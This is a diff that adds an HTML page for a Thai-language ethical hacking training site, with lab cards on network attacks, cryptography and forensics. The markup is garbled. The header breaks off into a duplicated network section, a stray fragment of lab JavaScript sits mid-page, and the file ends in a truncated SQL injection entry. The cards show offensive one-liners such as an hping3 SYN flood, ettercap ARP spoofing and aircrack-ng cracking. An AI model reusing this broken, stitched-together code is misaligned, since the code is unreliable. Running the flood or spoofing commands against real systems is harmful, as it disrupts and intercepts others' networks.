@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thai Ethical Hacking Labs - แล็บแฮ็กภาษาไทย</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500&display=swap');
+        
+        body { 
+            font-family: 'Sarabun', sans-serif; 
+            background: #0a0a0a;
+            color: #e0e0e0;
+        }
+        
+        .gradient-bg { 
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .gradient-bg::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="%23ffffff" stroke-width="0.1" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+        
+        .card-hover { 
+            transition: all 0.3s ease; 
+            background: rgba(20, 20, 30, 0.8);
+            border: 1px solid rgba(100, 255, 218, 0.1);
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+        }
+        
+        .card-hover:hover { 
+            transform: translateY(-5px); 
+            box-shadow: 0 20px 40px rgba(100, 255, 218, 0.1);
+            border-color: rgba(100, 255, 218, 0.3);
+            background: rgba(20, 20, 30, 0.9);
+        }
+        
+        .code-block { 
+            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%); 
+            border-radius: 8px; 
+            overflow-x: auto;
+            border: 1px solid #30363d;
+            font-family: 'Fira Code', monospace;
+        }
+        
+        .difficulty-easy { background: linear-gradient(45deg, #00ff88, #00cc6a); }
+        .difficulty-medium { background: linear-gradient(45deg, #ffaa00, #ff8800); }
+        .difficulty-hard { background: linear-gradient(45deg, #ff0066, #cc0044); }
+        
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.05;
+        }
+        
+        .glitch-text {
+            position: relative;
+            animation: glitch 2s infinite;
+        }
+        
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+        
+        .secret-hover {
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .secret-hover:hover {
+            color: #00ff88 !important;
+            text-shadow: 0 0 10px #00ff88;
+        }
+        
+        .easter-egg {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        
+        .easter-egg.revealed {
+            opacity: 1;
+        }
+        
+        .hacker-cursor {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        .neon-glow {
+            box-shadow: 0 0 20px rgba(100, 255, 218, 0.3);
+            border: 1px solid rgba(100, 255, 218, 0.5);
+        }
+        
+        .terminal-green { color: #00ff88; }
+        .terminal-red { color: #ff0066; }
+        .terminal-yellow { color: #ffaa00; }
+        .terminal-blue { color: #0099ff; }
+        .terminal-purple { color: #cc66ff; }
+    </style>
+</head>
+<body class="bg-gray-900">
+    <!-- Matrix Background -->
+    <canvas id="matrix-canvas" class="matrix-bg"></canvas>
+    <!-- Header -->
+    <header class="gradient-bg text-white shadow-2xl relative z-10">
+        <div class="container mx-auto px-6 py-8 relative z-20">
+            <div class="flex items-center justify-between">
+                <div>
+                    <h1 class="text-4xl font-bold mb-2 glitch-text">
+                        <span class="terminal-green">⚡</span> Thai <span class="secret-hover" onclick="revealEasterEgg('header-secret')">Ethical</span> Hacking Labs
+                        <script src="https://cdn.tailwindcss.com"></script>
+                        <link rel="stylesheet" href="LAB/lab.css">
+                <h2 class="text-3xl font-bold text-gray-100 mb-4">
+                    🔗 Network Security Labs
+                    <span class="text-sm terminal-blue ml-4">[NETWORK_SCAN_ACTIVE]</span>
+                </h2>
+                <p class="text-gray-400 text-lg">เรียนรู้การรักษาความปลอดภัยเครือข่ายและการตรวจจับการบุกรุก</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Port Scanning Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Port Scanning</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้การสแกนพอร์ตและการตรวจจับบริการ</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">nmap -sS -sV target.com</span>
+                    </div>
+                    <button onclick="showLab('port-scanning')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors neon-glow">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Man-in-the-Middle Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Man-in-the-Middle</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">ทำความเข้าใจการโจมตี MITM และการป้องกัน</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-yellow">ettercap -T -M arp:remote</span>
+                    </div>
+                    <button onclick="showLab('mitm')" class="w-full bg-yellow-600 hover:bg-yellow-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- DDoS Protection Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">DDoS Protection</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้การป้องกันการโจมตี DDoS</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-red">hping3 -S --flood target.com</span>
+                    </div>
+                    <button onclick="showLab('ddos')" class="w-full bg-red-600 hover:bg-red-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Wireless Security Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Wireless Security</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การรักษาความปลอดภัยเครือข่ายไร้สาย</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-blue">aircrack-ng -w wordlist.txt</span>
+                    </div>
+                    <button onclick="showLab('wireless')" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Firewall Configuration Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Firewall Config</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การตั้งค่าและจัดการ Firewall</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span>
+                    </div>
+                    <button onclick="showLab('firewall')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Network Forensics Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Network Forensics</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การวิเคราะห์ traffic และหาหลักฐาน</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-purple">wireshark -i eth0 -f "tcp port 80"</span>
+                    </div>
+                    <button onclick="showLab('network-forensics')" class="w-full bg-purple-600 hover:bg-purple-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="crypto-section" class="section hidden">
+            <div class="mb-8">
+                <h2 class="text-3xl font-bold text-gray-100 mb-4">
+                    🔐 Cryptography Labs
+                    <span class="text-sm terminal-red ml-4">[ENCRYPTION_ACTIVE]</span>
+                </h2>
+                <p class="text-gray-400 text-lg">เรียนรู้การเข้ารหัส การถอดรหัส และการวิเคราะห์ระบบเข้ารหัส</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Classical Ciphers Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Classical Ciphers</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้การเข้ารหัสแบบคลาสสิก Caesar, Vigenère</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">ROT13: URYYB JBEYQ</span>
+                    </div>
+                    <button onclick="showLab('classical-cipher')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors neon-glow">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- RSA Cryptography Lab -->
+                <div class="card-hover p-6 rounded-xl">...
+                        </div>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4">
+                            <h4 class="font-semibold text-yellow-800 mb-2">⚠️ คำเตือนด้านความปลอดภัย</h4>
+                            <p class="text-yellow-700">ห้ามรันตัวอย่างที่น่าสงสัยบนเครื่องหลักหรือเครือข่ายที่เชื่อมต่อกับภายนอก ใช้ sandbox/VM ที่ถูกแยก</p>
+                        </div>
+                        <div class="bg-gray-50 p-4 rounded-lg">
+                            <h4 class="font-semibold mb-2">🧭 แนวทางการวิเคราะห์</h4>
+                            <ul class="list-disc list-inside text-gray-700">
+                                <li>เริ่มด้วย static analysis: strings, file metadata</li>
+                                <li>จากนั้น dynamic analysis ใน sandbox เพื่อตรวจสอบ behavior (network, file system, registry)</li>
+                                <li>จัดทำรายงานและ IOC (Indicators of Compromise)</li>
+                            </ul>
+                        </div>
+                    </div>
+                `
+            }
+        };
+                    </div>
+                    <button onclick="showLab('csrf')" class="w-full bg-red-600 hover:bg-red-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Other sections (hidden by default) -->
+        <div id="network-section" class="section hidden">
+            <div class="mb-8">
+                <h2 class="text-3xl font-bold text-gray-100 mb-4">
+                    🔗 Network Security Labs
+                    <span class="text-sm terminal-blue ml-4">[NETWORK_SCAN_ACTIVE]</span>
+                </h2>
+                <p class="text-gray-400 text-lg">เรียนรู้การรักษาความปลอดภัยเครือข่ายและการตรวจจับการบุกรุก</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Port Scanning Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Port Scanning</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้การสแกนพอร์ตและการตรวจจับบริการ</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">nmap -sS -sV target.com</span>
+                    </div>
+                    <button onclick="showLab('port-scanning')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors neon-glow">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Man-in-the-Middle Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Man-in-the-Middle</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">ทำความเข้าใจการโจมตี MITM และการป้องกัน</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-yellow">ettercap -T -M arp:remote</span>
+                    </div>
+                    <button onclick="showLab('mitm')" class="w-full bg-yellow-600 hover:bg-yellow-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- DDoS Protection Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">DDoS Protection</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้การป้องกันการโจมตี DDoS</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-red">hping3 -S --flood target.com</span>
+                    </div>
+                    <button onclick="showLab('ddos')" class="w-full bg-red-600 hover:bg-red-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Wireless Security Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Wireless Security</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การรักษาความปลอดภัยเครือข่ายไร้สาย</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-blue">aircrack-ng -w wordlist.txt</span>
+                    </div>
+                    <button onclick="showLab('wireless')" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Firewall Configuration Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Firewall Config</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การตั้งค่าและจัดการ Firewall</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span>
+                    </div>
+                    <button onclick="showLab('firewall')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Network Forensics Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Network Forensics</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การวิเคราะห์ traffic และหาหลักฐาน</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-purple">wireshark -i eth0 -f "tcp port 80"</span>
+                    </div>
+                    <button onclick="showLab('network-forensics')" class="w-full bg-purple-600 hover:bg-purple-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="crypto-section" class="section hidden">
+            <div class="mb-8">
+                <h2 class="text-3xl font-bold text-gray-100 mb-4">
+                    🔐 Cryptography Labs
+                    <span class="text-sm terminal-red ml-4">[ENCRYPTION_ACTIVE]</span>
+                </h2>
+                <p class="text-gray-400 text-lg">เรียนรู้การเข้ารหัส การถอดรหัส และการวิเคราะห์ระบบเข้ารหัส</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Classical Ciphers Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Classical Ciphers</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้การเข้ารหัสแบบคลาสสิก Caesar, Vigenère</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">ROT13: URYYB JBEYQ</span>
+                    </div>
+                    <button onclick="showLab('classical-cipher')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors neon-glow">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- RSA Cryptography Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">RSA Cryptography</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">ทำความเข้าใจ RSA และการโจมตี</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-red">openssl rsa -in private.pem -text</span>
+                    </div>
+                    <button onclick="showLab('rsa')" class="w-full bg-red-600 hover:bg-red-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Hash Functions Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Hash Functions</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">เรียนรู้ Hash Functions และ Rainbow Tables</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-yellow">echo "password" | md5sum</span>
+                    </div>
+                    <button onclick="showLab('hash')" class="w-full bg-yellow-600 hover:bg-yellow-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Steganography Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Steganography</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การซ่อนข้อมูลในไฟล์และการค้นหา</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-blue">steghide extract -sf image.jpg</span>
+                    </div>
+                    <button onclick="showLab('steganography')" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Block Ciphers Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Block Ciphers</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">AES, DES และการโจมตี Block Cipher</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-purple">openssl enc -aes-256-cbc -d</span>
+                    </div>
+                    <button onclick="showLab('block-cipher')" class="w-full bg-purple-600 hover:bg-purple-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Digital Signatures Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Digital Signatures</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การสร้างและตรวจสอบลายเซ็นดิจิทัล</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">gpg --sign --armor document.txt</span>
+                    </div>
+                    <button onclick="showLab('digital-signature')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="forensics-section" class="section hidden">
+            <div class="mb-8">
+                <h2 class="text-3xl font-bold text-gray-100 mb-4">
+                    🔍 Digital Forensics Labs
+                    <span class="text-sm terminal-purple ml-4 secret-hover" onclick="revealEasterEgg('forensics-secret')">[EVIDENCE_SCAN]</span>
+                </h2>
+                <p class="text-gray-400 text-lg">เรียนรู้การตรวจสอบหลักฐานดิจิทัลและการวิเคราะห์ระบบ</p>
+                <div id="forensics-secret" class="easter-egg mt-4 p-4 bg-purple-900/30 rounded border border-purple-500/30">
+                    <p class="text-sm terminal-red">🕵️ HIDDEN FILE FOUND: /root/.secret_flag.txt</p>
+                    <p class="text-xs terminal-green mt-2">Flag: THM{y0u_f0und_th3_h1dd3n_f1l3}</p>
+                </div>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Memory Forensics Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Memory Forensics</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">วิเคราะห์ Memory Dump และหาหลักฐาน</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-purple">volatility -f memory.raw imageinfo</span>
+                    </div>
+                    <button onclick="showLab('memory-forensics')" class="w-full bg-purple-600 hover:bg-purple-500 text-white py-2 px-4 rounded-lg font-medium transition-colors neon-glow">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Disk Forensics Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Disk Forensics</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การตรวจสอบ Hard Disk และกู้คืนไฟล์</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-blue">autopsy disk.img</span>
+                    </div>
+                    <button onclick="showLab('disk-forensics')" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Network Packet Analysis Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Packet Analysis</h3>
+                        <span class="difficulty-medium text-white px-3 py-1 rounded-full text-sm font-medium">ปานกลาง</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">วิเคราะห์ Network Traffic และหาหลักฐาน</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-green">wireshark capture.pcap</span>
+                    </div>
+                    <button onclick="showLab('packet-analysis')" class="w-full bg-green-600 hover:bg-green-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Mobile Forensics Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Mobile Forensics</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">การตรวจสอบอุปกรณ์มือถือและแอป</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-red">adb shell dumpsys</span>
+                    </div>
+                    <button onclick="showLab('mobile-forensics')" class="w-full bg-red-600 hover:bg-red-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Log Analysis Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Log Analysis</h3>
+                        <span class="difficulty-easy text-white px-3 py-1 rounded-full text-sm font-medium">ง่าย</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">วิเคราะห์ System Logs และ Event Logs</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-yellow">grep "ERROR" /var/log/syslog</span>
+                    </div>
+                    <button onclick="showLab('log-analysis')" class="w-full bg-yellow-600 hover:bg-yellow-500 text-black py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+
+                <!-- Malware Analysis Lab -->
+                <div class="card-hover p-6 rounded-xl">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-xl font-semibold text-gray-100">Malware Analysis</h3>
+                        <span class="difficulty-hard text-white px-3 py-1 rounded-full text-sm font-medium">ยาก</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">วิเคราะห์ Malware และ Reverse Engineering</p>
+                    <div class="mb-4 text-xs font-mono text-gray-500">
+                        <span class="terminal-red">strings malware.exe | grep -i "http"</span>
+                    </div>
+                    <button onclick="showLab('malware-analysis')" class="w-full bg-red-600 hover:bg-red-500 text-white py-2 px-4 rounded-lg font-medium transition-colors">
+                        >> เริ่มแล็บ
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Lab Modal -->
+    <div id="lab-modal" class="fixed inset-0 bg-black bg-opacity-80 hidden z-50 flex items-center justify-center p-4">
+        <div class="bg-gray-900 rounded-xl max-w-4xl w-full max-h-[90vh] overflow-y-auto border border-green-400/30 neon-glow">
+            <div class="p-6 border-b border-gray-700">
+                <div class="flex items-center justify-between">
+                    <h3 id="lab-title" class="text-2xl font-bold text-gray-100"></h3>
+                    <button onclick="closeLab()" class="text-gray-400 hover:text-red-400 text-2xl transition-colors">×</button>
+                </div>
+            </div>
+            <div id="lab-content" class="p-6 text-gray-300">
+                <!-- Lab content will be inserted here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-950 text-white py-8 mt-16 border-t border-gray-800">
+        <div class="container mx-auto px-6">
+            <div class="grid md:grid-cols-3 gap-8">
+                <div>
+                    <h4 class="text-lg font-semibold mb-4 terminal-blue">📚 แหล่งอ้างอิง</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li class="secret-hover" onclick="revealEasterEgg('footer-secret')">• OWASP Top 10</li>
+                        <li>• PortSwigger Web Security Academy</li>
+                        <li>• HackerOne Hacktivity</li>
+                        <li>• SANS Institute</li>
+                    </ul>
+                    <div id="footer-secret" class="easter-egg mt-4 p-2 bg-blue-900/30 rounded border border-blue-500/30">
+                        <p class="text-xs terminal-blue">🎉 Final Easter Egg! คุณพบครบทั้ง 5 ตัวแล้ว!</p>
+                        <p class="text-xs terminal-green mt-1">Master Hacker Achievement Unlocked! 🏆</p>
+                    </div>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4 terminal-yellow">⚖️ จริยธรรม</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li>• ใช้เพื่อการศึกษาเท่านั้น</li>
+                        <li>• ไม่โจมตีระบบจริง</li>
+                        <li>• เคารพกฎหมาย</li>
+                        <li>• รายงานช่องโหว่อย่างรับผิดชอบ</li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4 terminal-green">🎯 วัตถุประสงค์</h4>
+                    <p class="text-gray-400">
+                        แพลตฟอร์มนี้จัดทำขึ้นเพื่อการศึกษาด้านความปลอดภัยไซเบอร์ 
+                        โดยรวบรวมเฉลยจากแหล่งที่เปิดเผยและอนุญาตให้ใช้งานได้
+                    </p>
+                    <div class="mt-4 text-xs font-mono terminal-green">
+                        <p>root@hacklab:~$ whoami</p>
+                        <p>ethical_hacker</p>
+                    </div>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-gray-500">
+                <p>© 2024 Thai Ethical Hacking Labs - เพื่อการศึกษาเท่านั้น</p>
+                <p class="text-xs mt-2 font-mono">System Status: <span class="terminal-green">ONLINE</span> | Security Level: <span class="terminal-red">MAXIMUM</span></p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Lab content data
+        const labData = {
+            'sql-injection': {
+                title: 'SQL Injection Lab',
+                content: `
